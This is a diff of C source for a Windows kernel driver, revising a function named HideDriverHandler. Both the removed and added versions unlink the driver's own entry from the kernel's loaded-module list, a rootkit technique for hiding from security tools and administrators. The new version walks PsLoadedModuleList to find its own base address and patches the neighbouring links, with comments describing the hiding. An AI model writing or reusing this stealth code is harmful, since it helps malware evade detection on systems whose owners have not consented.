@@ -38,48 +38,28 @@ KSPIN_LOCK g_Lock;
 KIRQL g_OldIrql;
 
 void HideDriverHandler(PDRIVER_OBJECT DriverObject) {
-    KIRQL oldIrql;
+    // revised. -- didn't work before.
 
-    // Raise IRQL to prevent race conditions
-    KeAcquireSpinLock(&g_Lock, &oldIrql);
+    PVOID thisDriverAddress = DriverObject->DriverStart;
+    PLIST_ENTRY head = &PsLoadedModuleList->InLoadOrderLinks;
+    PLIST_ENTRY current = head->Flink;
 
-    __try {
-        if (!DriverObject) {
-            debug_print("[!] Invalid DriverObject!\n");
-            __leave;
+    while (current != head) {
+        //iterate over all of the list until we find kernel base (it should be the first one, but in case it is not, we will end up in it anyway.
+        PKLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+        if (entry->DllBase == thisDriverAddress) {
+            // this is our driver, unlink.
+            PLIST_ENTRY prev = current->Blink;
+            PLIST_ENTRY next = current->Flink;
+
+            // simple logic, the forward link of the previous driver was us, now we set it to the next one (our forward link). vice versa for backwards.
+            prev->Flink = next;
+            next->Blink = prev;
+            break;
         }
-
-        
-
-        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
-        if (!entry || !MmIsAddressValid(entry)) {
-            debug_print("[!] Invalid driver section.\n");
-            __leave;
-        }
-
-        // Unlink from PsLoadedModuleList
-        PLIST_ENTRY prevEntry = entry->InLoadOrderLinks.Blink;
-        PLIST_ENTRY nextEntry = entry->InLoadOrderLinks.Flink;
-
-        KeMemoryBarrier();
-
-        // Essentially, skip over us when iterating over the loaded drivers.
-        prevEntry->Flink = nextEntry;
-        nextEntry->Blink = prevEntry;
-
-        KeMemoryBarrier();
-
-        debug_print("[+] Driver is now hidden.\n");
+        current = current->Flink;
     }
-    __except (EXCEPTION_EXECUTE_HANDLER) {
-        debug_print("[!] Exception while hiding driver.\n");
-    }
-
-    // Release the spinlock
-    KeReleaseSpinLock(&g_Lock, oldIrql);
-    debug_print("[+] Releasing spinlock in HideDriver function.\n");
 }
-
 
 /*
 End Of Functions.
